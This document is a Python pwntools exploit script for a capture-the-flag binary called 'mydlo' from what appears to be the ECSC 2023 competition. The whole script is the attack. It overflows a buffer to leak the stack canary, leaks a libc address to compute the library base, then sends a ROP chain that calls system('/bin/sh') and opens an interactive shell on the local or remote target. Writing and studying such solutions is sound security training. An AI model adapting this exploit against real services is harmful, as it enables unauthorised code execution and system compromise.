#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF('mydlo', checksec=False)
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]


def get_conn(argv=[], *a, **kw):
	host = args.HOST or 'mydlo.ecsc23.hack.cert.pl'
	port = int(args.PORT or 5064)
	if args.GDB:
		return gdb.debug([exe.path] + argv, *a, **kw)
	elif args.REMOTE:
		return remote(host, port)
	else:
		kw.pop('gdbscript')
		return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+79
continue
'''
gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
env = {}

io = get_conn(env=env, gdbscript=gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
li = lambda *a, **k: log.info(*a, **k)
ls = lambda *a, **k: log.success(*a, **k)
def protect_ptr(pos, ptr): return (pos >> 12) ^ ptr


MAX_LEN = 0x300
payload = b"A" * 0x18 + b'B'

s(payload)

cookie = rl()[0x19:].strip()[:-1]
print(cookie)
cookie = cookie.rjust(8, p8(0))

ls(f'cookie: {u64(cookie):#x}')

payload = b"A" * 0x18

s(flat(
	b"A" * 0x20,
	b'B' * 8,
))

libc_leak = rl()[0x28:].strip()
libc_leak = u64(libc_leak.ljust(8, p8(0)))
ls(f'libc_leak: {libc_leak:#x}')


libc = ELF("./libc.so.6")
libc.address = libc_leak - 0x23a90

ls(f'libc.address: {libc.address:#x}')

rop = ROP(libc)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
BIN_SH = next(libc.search(b'/bin/sh\x00'))


s(flat(
	b'exit\x00xit',
	b"A" * 0x10,
	cookie,
	b'B' * 8,
	POP_RDI,
	BIN_SH,
	POP_RDI+1,
	libc.symbols.system,
	libc.symbols.exit
))

ia()
